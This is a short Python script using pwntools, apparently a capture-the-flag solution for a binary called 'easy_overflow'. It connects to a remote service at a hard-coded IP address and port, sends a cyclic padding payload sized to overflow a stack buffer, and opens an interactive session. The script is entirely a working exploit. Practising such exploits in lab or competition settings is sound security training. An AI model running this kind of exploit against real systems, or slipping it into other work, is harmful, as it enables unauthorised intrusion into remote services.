from pwn import *
context(log_level='debug',arch='amd64',os='linux',terminal=['tmux','splitw','-h'])

io=remote("43.143.7.127",28021)
# io=process("./easy_overflow")


payload=cyclic(0x30-0x4+0x1)
io.recvuntil(b"\n")
io.sendline(payload)
io.interactive()